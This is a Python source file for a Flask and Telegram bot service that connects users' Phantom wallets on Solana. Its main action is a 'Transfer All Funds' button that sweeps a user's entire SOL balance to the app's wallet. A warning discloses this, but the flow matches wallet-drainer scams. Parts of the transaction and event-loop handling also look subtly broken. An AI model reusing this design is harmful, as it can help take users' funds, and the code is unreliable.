from flask import Flask, request, redirect
import logging
import asyncio
import threading
import os
from telegram import InlineKeyboardMarkup, InlineKeyboardButton
from config import TELEGRAM_BOT_TOKEN, CALLBACK_BASE_URL
from session_manager import SessionManager
from phantom import PhantomUtils
from solana_utils import SolanaUtils

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)

# Initialize components
session_manager = SessionManager()
solana_utils = SolanaUtils()

# Since we're running Flask and Telegram bot in the same process,
# we need to handle the async nature of the Telegram bot
# We'll create a global application instance
from telegram.ext import Application
telegram_app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

@app.route("/connect")
def phantom_connect_callback():
    """Handle wallet connection callback from Phantom"""
    try:
        # Extract parameters from callback
        session_id = request.args.get("session")
        public_key = request.args.get("phantom_encryption_public_key")
        signature = request.args.get("signature")  # Phantom may send a signature for validation
        
        logger.info(f"Received connect callback for session: {session_id}")
        
        # Validate callback parameters
        is_valid, message = PhantomUtils.validate_connect_callback(session_id, public_key)
        if not is_valid:
            logger.error(f"Invalid connect callback: {message}")
            return f"Invalid callback: {message}", 400
            
        # Validate session using HMAC signature
        session_data = {
            "session": session_id,
            "phantom_encryption_public_key": public_key
        }
        if signature:
            session_data["signature"] = signature
            
        is_valid, result = session_manager.validate_session(session_id, session_data)
        if not is_valid:
            logger.error(f"Session validation failed: {result}")
            return f"Session validation failed: {result}", 400
            
        # Store wallet public key in session
        session_manager.store_wallet_connection(session_id, public_key)
        
        # Get user ID from session
        user_id = result["user_id"]
        
        # Notify user in Telegram
        asyncio.run_coroutine_threadsafe(
            send_connection_success_message(user_id, session_id, public_key),
            telegram_app.bot._request._client_session._loop
        )
        
        return "OK", 200
    except Exception as e:
        logger.error(f"Error in connect callback: {str(e)}")
        return f"Error: {str(e)}", 500

@app.route("/sign")
def phantom_sign_callback():
    """Handle transaction signing callback from Phantom"""
    try:
        # Extract parameters from callback
        session_id = request.args.get("session")
        signature = request.args.get("signature")
        
        logger.info(f"Received sign callback for session: {session_id}")
        
        # Validate callback parameters
        is_valid, message = PhantomUtils.validate_sign_callback(session_id, signature)
        if not is_valid:
            logger.error(f"Invalid sign callback: {message}")
            return f"Invalid callback: {message}", 400
            
        # Validate session using HMAC signature
        session_data = {
            "session": session_id,
            "signature": signature
        }
        
        is_valid, result = session_manager.validate_session(session_id, session_data)
        if not is_valid:
            logger.error(f"Session validation failed: {result}")
            return f"Session validation failed: {result}", 400
            
        # Check if this is a transfer action
        if result.get("action") != "transfer":
            logger.error(f"Invalid session action: {result.get('action')}")
            return "Invalid session action", 400
            
        # Get user ID from session
        user_id = result["user_id"]
        
        # Increment transfer count for rate limiting
        session_manager.increment_transfer_count(user_id)
        
        # Submit signed transaction to Solana network
        try:
            tx_signature = solana_utils.submit_signed_transaction(signature)
        except Exception as e:
            logger.error(f"Transaction submission failed: {str(e)}")
            asyncio.run_coroutine_threadsafe(
                send_transaction_failure_message(user_id, str(e)),
                telegram_app.bot._request._client_session._loop
            )
            return f"Transaction failed: {str(e)}", 400
            
        # Notify user of success in Telegram
        asyncio.run_coroutine_threadsafe(
            send_transaction_success_message(user_id, tx_signature),
            telegram_app.bot._request._client_session._loop
        )
        
        # Clean up session
        session_manager.delete_session(session_id)
        
        return "OK", 200
    except Exception as e:
        logger.error(f"Error in sign callback: {str(e)}")
        return f"Error: {str(e)}", 500

async def send_connection_success_message(user_id, session_id, public_key):
    """Send wallet connection success message to user"""
    try:
        # Get user's balance
        balance = solana_utils.get_user_balance(public_key)
        sol_balance = balance / 1_000_000_000  # Convert lamports to SOL
        
        keyboard = [[
            InlineKeyboardButton(
                "💰 Transfer All Funds", 
                callback_data=f"initiate_transfer_{session_id}"
            ),
            InlineKeyboardButton("❌ Cancel", callback_data="cancel")
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await telegram_app.bot.send_message(
            chat_id=user_id,
            text=f"✅ Wallet successfully connected!\n\n"
                 f"Wallet: {public_key}\n"
                 f"Balance: {sol_balance:.9f} SOL\n\n"
                 f"⚠️ SECURITY ALERT: Clicking 'Transfer All Funds' will move ALL your SOL to the app wallet.\n"
                 f"Please confirm this action carefully.",
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Failed to send connection success message: {str(e)}")
        await telegram_app.bot.send_message(
            chat_id=user_id,
            text=f"✅ Wallet connected, but failed to retrieve balance: {str(e)}"
        )

async def send_transaction_success_message(user_id, tx_signature):
    """Send transaction success message to user"""
    try:
        await telegram_app.bot.send_message(
            chat_id=user_id,
            text=f"🎉 Funds transferred successfully!\n\n"
                 f"Transaction signature: {tx_signature}\n"
                 f"View on [Solana Explorer](https://solscan.io/tx/{tx_signature})",
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Failed to send transaction success message: {str(e)}")

async def send_transaction_failure_message(user_id, error_message):
    """Send transaction failure message to user"""
    try:
        await telegram_app.bot.send_message(
            chat_id=user_id,
            text=f"❌ Transaction failed: {error_message}"
        )
    except Exception as e:
        logger.error(f"Failed to send transaction failure message: {str(e)}")

def run_telegram_bot():
    """Run the Telegram bot in a separate thread"""
    try:
        telegram_app.run_polling()
    except Exception as e:
        logger.error(f"Failed to run Telegram bot: {str(e)}")

def start_services():
    """Start both Flask and Telegram bot services"""
    # Start Telegram bot in a separate thread
    telegram_thread = threading.Thread(target=run_telegram_bot)
    telegram_thread.daemon = True
    telegram_thread.start()
    
    # Start Flask service
    # Note: In production, you should use a proper WSGI server like Gunicorn
    app.run(host="0.0.0.0", port=443, ssl_context='adhoc', threaded=True)

if __name__ == "__main__":
    start_services()
